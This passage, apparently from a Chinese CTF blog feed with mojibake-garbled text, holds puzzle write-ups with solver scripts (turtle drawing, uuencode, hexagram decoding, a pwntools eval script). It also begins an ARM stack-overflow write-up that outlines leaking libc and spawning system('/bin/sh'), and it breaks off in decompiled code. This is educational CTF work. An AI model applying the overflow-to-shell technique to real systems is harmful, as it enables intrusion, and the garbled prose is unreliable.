U(UP),D(DOWN),L(LEFT),R(RIGHT)ï¼Œå³ä¸Šä¸‹å·¦å³å’¯ï¼Œæ—¢ç„¶æ˜¯è®©çŒ«å’ªæŒ‰è¿™ä¸ªè·‘ï¼Œå¾ˆç®€å•å°±æ˜¯ç”»å‡ºè·¯çº¿å›¾å˜›ï¼Œå†™ä¸€ä¸ªç®€å•çš„pythonè„šæœ¬ï¼Œåˆ©ç”¨tutleæµ·é¾Ÿåº“å†™ï¼Œgetflagï¼š</p><p>flag{MeowMeow}</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> turtle <span class="token keyword">as</span> T<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'seq.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    strings <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>strings<span class="token punctuation">)</span>T<span class="token punctuation">.</span>speed<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> strings<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token string">'U'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>seth<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token string">"D"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>seth<span class="token punctuation">(</span><span class="token number">270</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token string">"L"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>seth<span class="token punctuation">(</span><span class="token number">180</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token string">"R"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>seth<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><blockquote><p>è¿è¡Œç»“æœ:</p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc0561d47cad.png" class="lazyload"></p><h2 id="å¥¹çš„è¯—"><a href="#å¥¹çš„è¯—" class="headerlink" title="å¥¹çš„è¯—"></a>å¥¹çš„è¯—</h2><blockquote><p>é¢˜ç›®ç»™äº†ä¸€ä¸ªpoem.zipï¼ŒåŒ…å«ä¸€ä¸ªpythonè§£å¯†è„šæœ¬å’Œä¸€ä¸ªåŒ…å«åŠ å¯†åè¯—çš„æ–‡ä»¶ã€‚æ ¹æ®è§£å¯†è„šæœ¬å¯ä»¥çŸ¥é“æ˜¯uuencodeï¼Œå¼€å§‹è¿‡äºç›¸ä¿¡è¿™ä¸ªè§£å¯†è„šæœ¬ï¼Œæ²¡æƒ³åˆ°å‡ºé¢˜äººåœ¨è¿™å„¿åŠ¨æ‰‹è„š</p><pre class=" language-python"><code class="language-python">   <span class="token comment" spellcheck="true">#!/usr/bin/env python3</span>   <span class="token comment" spellcheck="true"># This script helps you decode "her poem"</span>   <span class="token keyword">from</span> codecs <span class="token keyword">import</span> decode   fin <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"poem.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>   fout <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"poem.out"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> fin<span class="token punctuation">:</span>      data <span class="token operator">=</span> <span class="token string">"begin 666 &lt;data>\n"</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">" \nend\n"</span>      decode_data <span class="token operator">=</span> decode<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"uu"</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span>decode_data<span class="token punctuation">)</span>      fout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>decode_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>   fin<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   fout<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>   <strong>é‡ç‚¹ï¼åœ¨çº¿è§£å¯†å¯†æ–‡å³å¯å¾—åˆ°çœŸæ­£çš„flag</strong>ï¼Œflagåˆ†æ•£è—åœ¨æ¯è¡Œçš„å¤´éƒ¨ï¼Œä½†æ˜¯flagå°‘äº†ä¸€ä¸ªnéœ€è¦è‡ªè¡Œæ·»åŠ åœ¨æœ€åé¢è¡¥å…¨ä¸ºä¸€ä¸ªå•è¯funã€‚</p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc057e2cd0ed.png" class="lazyload"></p><h2 id="çŒ«å’ªå…‹æ˜Ÿ"><a href="#çŒ«å’ªå…‹æ˜Ÿ" class="headerlink" title="çŒ«å’ªå…‹æ˜Ÿ"></a>çŒ«å’ªå…‹æ˜Ÿ</h2><blockquote><p>nc 202.38.95.46 12009 </p><p>èŸ’è›‡æ˜¯ä¸€ç§éå¸¸å®¹æ˜“ä½¿ç”¨çš„ç¼–ç¨‹è¯­è¨€ï¼Œè€ƒéªŒä½ åƒä¸åƒèŸ’è›‡çš„æ ‡å‡†å°±æ˜¯ç»™ä½ ä¸€äº› Python 3 è¡¨è¾¾å¼ã€‚å¦‚æœä½ èƒ½æ­£ç¡®è®¡ç®—å‡ºæ¥ï¼Œä½ å°±é€šè¿‡äº†éªŒè¯ã€‚ </p><p>ç®€å•æ¥è¯´å°±æ˜¯è¦åœ¨30ç§’å†…å®ŒæˆæŒ‡å®šæ¬¡æ•°è¡¨è¾¾å¼çš„è®¡ç®—ï¼Œç„¶åå¯ä»¥å¾—åˆ°æœåŠ¡å™¨ç»™å‡ºçš„flagï¼Œä½†æ˜¯å‘çˆ¹çš„æ˜¯è¡¨è¾¾å¼ä¸­æœ‰ä¸€äº›ç‰¹æ®Šå‡½æ•°ï¼Œç±»ä¼¼äºç›®å½•éå† find ~,sleep(100),exit()ï¼Œæ‰€ä»¥è¿™ç§ä¸œè¥¿æˆ‘é‡‡å–äº†æ›¿æ¢çš„æ–¹æ³•ã€‚<br>â€‹<br>å› ä¸ºprintå‡½æ•°åœ¨python3å’Œpython2ä¸­ä¸åŒï¼Œè€Œæˆ‘éœ€è¦ä½¿ç”¨python2ä¸­çš„pwntoolsåº“ï¼ˆpython3çš„socketä¸çŸ¥ä¸ºä½•æ— ç”¨ï¼‰ï¼ŒåŒæ—¶æ‹¥æœ‰python3çš„printå‡½æ•°ç‰¹æ€§ï¼Œè¿™æ—¶å€™å°±éœ€è¦:</p><p>from _ _ future _ _ import print_function</p><p>å¼•å…¥python3 printå‡½æ•°ã€‚</p><p>æœ€ç»ˆè„šæœ¬å¦‚ä¸‹(è„šæœ¬æ¯”è¾ƒç®€é™‹ï¼Œå¯èƒ½éœ€è¦å¤šè·‘å‡ æ¬¡æ‰èƒ½å‡ºflag)ï¼š</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> __future__ <span class="token keyword">import</span> print_function<span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"202.38.95.46"</span><span class="token punctuation">,</span><span class="token number">12009</span><span class="token punctuation">)</span>getit <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    strings <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> strings<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'sleep(100)'</span><span class="token punctuation">,</span><span class="token string">'int(1)'</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> strings<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'exit()'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> strings<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'find ~'</span><span class="token punctuation">,</span><span class="token string">'echo 1'</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> strings<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"__import__('time')."</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>strings<span class="token punctuation">)</span>    key <span class="token operator">=</span> eval<span class="token punctuation">(</span>strings<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> strings<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>strings<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><blockquote><p>è„šæœ¬è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc05b09d0ecf.png" class="lazyload"></p><h2 id="çŒ«å’ªç”µè·¯"><a href="#çŒ«å’ªç”µè·¯" class="headerlink" title="çŒ«å’ªç”µè·¯"></a>çŒ«å’ªç”µè·¯</h2><blockquote><p>å½“å¹´ç©çš„minercraftè¢«åšæˆäº†é¢˜ç›®ï¼Œå¥½å§ï¼Œçº¢çŸ³ç”µè·¯ï¼Œè¿™æ˜¯ä¸€ä¸ªå­˜æ¡£ï¼Œéœ€è¦æˆ‘ä»¬æŒ‰è§„å¾‹è¾“å…¥ä¿¡å·ï¼Œç„¶åç›´åˆ°å…‰æŸ±äº®èµ·ï¼Œæ­£ç¡®çš„ä¿¡å·å³ä¸ºflag:</p><p>flag{0110101000111100101111111111111111111010} </p></blockquote><h2 id="FLXG-çš„ç§˜å¯†"><a href="#FLXG-çš„ç§˜å¯†" class="headerlink" title="FLXG çš„ç§˜å¯†"></a>FLXG çš„ç§˜å¯†</h2><blockquote><p>é¢˜ç›®æœ‰ç‚¹é•¿ï¼Œæˆ‘æ€»ç»“ä¸€ä¸‹ï¼Œç»™å‡ºçš„æ–‡ä»¶ä¸­æ˜¯ä¼ç¾²å…­åå››å¦çš„å¦è±¡ï¼Œç®€å•æœç´¢ä¸€ä¸‹å¯ä»¥çŸ¥é“ï¼Œä¼ç¾²å…­åå››å¦å¯ä»¥è·ŸäºŒè¿›åˆ¶æ‰¯ä¸Šå…³ç³»ï¼Œå…­åå››å¦åˆ†åˆ«å¯¹åº”äºŒè¿›åˆ¶000000-111111ï¼Œå¯¹åº”å…³ç³»å¦‚ä¸‹:</p></blockquote><pre class=" language-shell"><code class="language-shell">'å¤': '000000', 'å‰¥': '000001', 'æ¯”': '000010', 'è§‚': '000011', 'è±«': '000100', 'æ™‹': '000101', 'èƒ': '000110', 'å¦': '000111', 'è°¦': '001000', 'è‰®': '001001', 'è¹‡': '001010', 'æ¸': '001011', 'å°è¿‡': '001100', 'æ—…': '001101', 'å’¸': '001110', 'é': '001111', 'å¸ˆ': '010000', 'è’™': '010001', 'å': '010010', 'æ¶£': '010011', 'è§£': '010100', 'æœªæµ': '010101', 'å›°': '010110', 'è®¼': '010111', 'å‡': '011000', 'è›Š': '011001', 'äº•': '011010', 'å·½': '011011', 'æ’': '011100', 'é¼': '011101', 'å¤§è¿‡': '011110', 'å§¤': '011111', 'å¤': '100000', 'é¢': '100001', 'å±¯': '100010', 'ç›Š': '100011', 'éœ‡': '100100', 'å™¬å—‘': '100101', 'éš': '100110', 'æ— å¦„': '100111', 'æ˜å¤·': '101000', 'è´²': '101001', 'æ—¢æµ': '101010', 'å®¶äºº': '101011', 'ä¸°': '101100', 'ç¦»': '101101', 'é©': '101110', 'åŒäºº': '101111', 'ä¸´': '110000', 'æŸ': '110001', 'èŠ‚': '110010', 'ä¸­å­š': '110011', 'å½’å¦¹': '110100', 'ç½': '110101', 'å…‘': '110110', 'å±¥': '110111', 'æ³°': '111000', 'å¤§ç•œ': '111001', 'éœ€': '111010', 'å°ç•œ': '111011', 'å¤§å£®': '111100', 'å¤§æœ‰': '111101', 'å¤¬': '111110', 'ä¹¾': '111111'</code></pre><blockquote><p>å†™ä¸€ä¸ªpythonè„šæœ¬å°†é‚£ä¸ªæ–‡ä»¶ä¸­çš„å¦è±¡åˆ†åˆ«è§£æˆäºŒè¿›åˆ¶ï¼Œå¯ä»¥å‘ç°bitæ•°æ­£å¥½æ˜¯4039032ï¼Œå¯ä»¥æ•´é™¤8ï¼ˆ8bitä¸º1byteï¼‰ã€‚åˆ°è¿™åŸºæœ¬ä¸Šå¯ä»¥åˆ¤æ–­æ€è·¯æ­£ç¡®ã€‚</p><p>è„šæœ¬å¦‚ä¸‹:</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> respecial <span class="token operator">=</span> <span class="token triple-quoted-string string">'''ä¹¾ï¹‘å¤ï¹‘å±¯ï¹‘è’™ï¹‘éœ€ï¹‘è®¼ï¹‘å¸ˆï¹‘æ¯”ï¹‘å°ç•œï¹‘å±¥ï¹‘æ³°ï¹‘å¦ï¹‘åŒäººï¹‘å¤§æœ‰ï¹‘è°¦ï¹‘è±«ï¹‘éšï¹‘è›Šï¹‘ä¸´ï¹‘è§‚ï¹‘å™¬å—‘ï¹‘è´²ï¹‘å‰¥ï¹‘å¤ï¹‘æ— å¦„ï¹‘å¤§ç•œï¹‘é¢ï¹‘å¤§è¿‡ï¹‘åï¹‘ç¦»ï¹‘å’¸ï¹‘æ’ï¹‘éï¹‘å¤§å£®ï¹‘æ™‹ï¹‘æ˜å¤·ï¹‘å®¶äººï¹‘ç½ï¹‘è¹‡ï¹‘è§£ï¹‘æŸï¹‘ç›Šï¹‘å¤¬ï¹‘å§¤ï¹‘èƒï¹‘å‡ï¹‘å›°ï¹‘äº•ï¹‘é©ï¹‘é¼ï¹‘éœ‡ï¹‘è‰®ï¹‘æ¸ï¹‘å½’å¦¹ï¹‘ä¸°ï¹‘æ—…ï¹‘å·½ï¹‘å…‘ï¹‘æ¶£ï¹‘èŠ‚ï¹‘ä¸­å­šï¹‘å°è¿‡ï¹‘æ—¢æµï¹‘æœªæµ'''</span><span class="token comment" spellcheck="true">#äºŒè¿›åˆ¶é¡ºåºçš„å¦è±¡</span>guashu <span class="token operator">=</span> <span class="token triple-quoted-string string">'''å¤ã€å‰¥ã€æ¯”ã€è§‚ã€è±«ã€æ™‹ã€èƒã€å¦ã€è°¦ã€è‰®ã€è¹‡ã€æ¸ã€å°è¿‡ã€æ—…ã€å’¸ã€éã€å¸ˆã€è’™ã€åã€æ¶£ã€è§£ã€æœªæµã€å›°ã€è®¼ã€å‡ã€è›Šã€äº•ã€å·½ã€æ’ã€é¼ã€å¤§è¿‡ã€å§¤ã€å¤ã€é¢ã€å±¯ã€ç›Šã€éœ‡ã€å™¬å—‘ã€éšã€æ— å¦„ã€æ˜å¤·ã€è´²ã€æ—¢æµã€å®¶äººã€ä¸°ã€ç¦»ã€é©ã€åŒäººã€ä¸´ã€æŸã€èŠ‚ã€ä¸­å­šã€å½’å¦¹ã€ç½ã€å…‘ã€å±¥ã€æ³°ã€å¤§ç•œã€éœ€ã€å°ç•œã€å¤§å£®ã€å¤§æœ‰ã€å¤¬ã€ä¹¾'''</span><span class="token keyword">def</span> <span class="token function">Getword</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    strings <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    s<span class="token operator">=</span>special<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'ï¹‘'</span><span class="token punctuation">)</span>    s2 <span class="token operator">=</span> guashu<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"ã€"</span><span class="token punctuation">)</span>    diction <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'G://æ•°æ®//ctfèµ›é¢˜//ä¸­ç§‘å¤§ctf//flxgçš„ç§˜å¯†.txt'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        strings2 <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> strings2<span class="token punctuation">:</span>            strings<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> set<span class="token punctuation">(</span>strings<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#å› ä¸ºå¦è±¡ä¸­å­˜åœ¨ä¸€ä¸ªå­—æˆ–è€…ä¸¤ä¸ªå­—çš„å¦è±¡ï¼Œjiebaåˆ†è¯åº“ä¸å‡†ç¡®ï¼Œå°±ç”¨/æ¥åŒºåˆ«</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>        diction<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>strings2<span class="token punctuation">.</span>count<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        strings2 <span class="token operator">=</span> strings2<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token string">'/'</span><span class="token operator">+</span>i<span class="token operator">+</span><span class="token string">'/'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> diction<span class="token punctuation">,</span>strings2<span class="token punctuation">,</span>s2<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    diction<span class="token punctuation">,</span>strings2<span class="token punctuation">,</span>s2 <span class="token operator">=</span> Getword<span class="token punctuation">(</span><span class="token punctuation">)</span>    finalbin <span class="token operator">=</span><span class="token string">''</span>    finaldiclist<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    dicts<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    n<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> diction<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        n<span class="token operator">+=</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">6</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'bits='</span><span class="token operator">+</span>str<span class="token punctuation">(</span>n<span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    finalstrings <span class="token operator">=</span> strings2<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> a <span class="token keyword">in</span> finalstrings<span class="token punctuation">:</span>        <span class="token keyword">if</span> a <span class="token keyword">in</span> s2<span class="token punctuation">:</span>            finaldiclist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#å»ºç«‹å¦è±¡ä¸äºŒè¿›åˆ¶çš„å…³ç³»å­—å…¸</span>    nice <span class="token operator">=</span><span class="token number">0</span>    n<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s2<span class="token punctuation">:</span>        dicts<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> format<span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>        n<span class="token operator">=</span>n<span class="token operator">+</span><span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>dicts<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>finaldiclist<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#æŒ‰å­—å…¸è§£å¯†å†™å…¥æ–‡ä»¶</span>    <span class="token keyword">for</span> b <span class="token keyword">in</span> finaldiclist<span class="token punctuation">:</span>        finalbin<span class="token operator">+=</span>dicts<span class="token punctuation">[</span>b<span class="token punctuation">]</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'finalbin.txt'</span><span class="token punctuation">,</span><span class="token string">'w+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> ff<span class="token punctuation">:</span>        ff<span class="token punctuation">.</span>write<span class="token punctuation">(</span>finalbin<span class="token punctuation">)</span></code></pre><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc07be42ac0e.png" class="lazyload"></p><blockquote><p>æ¥ä¸‹æ¥åˆ©ç”¨pythonçš„libnumåº“ï¼Œå°†äºŒè¿›åˆ¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²å¾—åˆ°ç¬¬ä¸€ä¸ªflagï¼š</p></blockquote><p>  <img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc0611d2a07a.png" class="lazyload"></p><blockquote><p>ç”¨binwalkåˆ†æä¸€ä¸‹å†…å®¹ï¼Œå‘ç°é‡Œé¢æœ‰ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè¿›è¡Œæå–å¾—åˆ°ä»¥ä¸‹æ–‡ä»¶ï¼šä¸€ä¸ªflag elfç¨‹åº ï¼Œpasskey.txtï¼Œç®€å•çœ‹ä¸€ä¸‹ï¼Œæ¥ä¸‹æ¥çš„ç¬¬äºŒé¢˜åº”è¯¥æ˜¯é€†å‘äº†ã€‚ã€‚å¾…æ›´æ–°ã€‚ã€‚ã€‚</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc061b548e19.png" class="lazyload"></p></blockquote><p>å…ˆåˆ°è¿™ ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> writeup </tag>
            
            <tag> ustc </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10æœˆ16-Codegate2018</title>
      <link href="/2018/10/16/Pwn-10%E6%9C%8816-Codegate2018-melong/"/>
      <url>/2018/10/16/Pwn-10%E6%9C%8816-Codegate2018-melong/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="Pwn-10æœˆ16-Codegate2018-melong"><a href="#Pwn-10æœˆ16-Codegate2018-melong" class="headerlink" title="Pwn-10æœˆ16-Codegate2018-melong"></a>Pwn-10æœˆ16-Codegate2018-melong</h1><blockquote><p>åŒæ ·å€ŸåŠ©<a href="https://m4x.fun/post/how-2-pwn-an-arm-binary/" target="_blank" rel="noopener">m4xå¤§ä½¬</a>çš„åšå®¢æ¥çœ‹ä¸€çœ‹è¿™ä¸€é¢˜æ˜¯ä¸€ä¸ªæ€ä¹ˆæ ·çš„è§£é¢˜æ€è·¯ã€‚</p><p>æ ¹æ®å¤§ä½¬åŸè¯<code>æ¼æ´å¾ˆå¥½æ‰¾, write_diary ä¸­ read çš„é•¿åº¦æ˜¯ç”±æˆ‘ä»¬è¾“å…¥çš„, å¯ä»¥æ ˆæº¢å‡º, å…ˆè¿›å…¥ PT å‡½æ•°, è¾“å…¥ -1, å†è¿›å…¥ write_diary, å°±å¯ä»¥å®ç° arbitrary overflow äº†, å› æ­¤æ€è·¯åŒ x64 ä¸‹çš„ rop ç›¸åŒ, å…ˆ leak å‡º libc åŸºå€, ç„¶åæ§åˆ¶æ‰§è¡Œ system(â€œ/bin/shâ€) å³å¯</code>ï¼Œæˆ‘ä»¬æ¥è¿›è¡Œåˆ†æï¼š</p></blockquote><h2 id="ä¸€-æŸ¥çœ‹ä¿æŠ¤æªæ–½"><a href="#ä¸€-æŸ¥çœ‹ä¿æŠ¤æªæ–½" class="headerlink" title="ä¸€.æŸ¥çœ‹ä¿æŠ¤æªæ–½"></a>ä¸€.æŸ¥çœ‹ä¿æŠ¤æªæ–½</h2><blockquote><p>å…ˆçœ‹ä¸€ä¸‹ç¨‹åºçš„åŸºæœ¬ä¿¡æ¯å’¯ï¼š</p><p><img src="https://i.loli.net/2018/10/16/5bc55a518786c.png" alt=""></p><p>å¯ä»¥çŸ¥é“è¿™ä¸ªæ˜¯ä¸ª32ä½armæ¶æ„çš„ç¨‹åºï¼Œå¹¶ä¸”éœ€è¦åŠ¨æ€é“¾æ¥å…±äº«åº“æ¥è¿è¡Œã€‚çœ‹ä¸€ä¸‹å®ƒçš„ä¿æŠ¤æªæ–½ï¼š</p><p>â€‹    <img src="https://i.loli.net/2018/10/16/5bc55b1e51a4f.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°å¹¶æ²¡æœ‰å¼€å¯æ ˆæº¢å‡ºä¿æŠ¤ï¼Œä»¥åŠnxï¼Œpieç­‰ä¿æŠ¤æªæ–½ã€‚</p></blockquote><h2 id="äºŒ-é™æ€åˆ†æç¨‹åºé€»è¾‘"><a href="#äºŒ-é™æ€åˆ†æç¨‹åºé€»è¾‘" class="headerlink" title="äºŒ.é™æ€åˆ†æç¨‹åºé€»è¾‘"></a>äºŒ.é™æ€åˆ†æç¨‹åºé€»è¾‘</h2><blockquote><p>å…ˆä¸‹è½½ä¸€ä¸‹ç¼ºå°‘çš„åŠ¨æ€å…±äº«åº“ï¼š</p><p><code>sudo apt-get install libc6-armel-cross</code></p><p>è¿™æ ·å¯ä»¥è§£å†³ç¼ºå°‘<code>/lib/ld-linux.so.3</code>çš„é—®é¢˜ï¼Œç„¶åç®€å•è¿è¡Œä¸€ä¸‹çœ‹çœ‹ï¼š</p><p><img src="https://i.loli.net/2018/10/16/5bc5eaee90791.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°heightè¾“å…¥çš„åœ°æ–¹å¯èƒ½å­˜åœ¨æº¢å‡ºï¼Œæ¥ä¸‹æ¥idaçœ‹ä¸€çœ‹ç¨‹åºé€»è¾‘ï¼š</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// r0</span>  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+0h] [bp-54h]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+34h] [bp-20h]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+38h] [bp-1Ch]</span>  size_t v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+40h] [bp-14h]</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+4Ch] [bp-8h]</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token 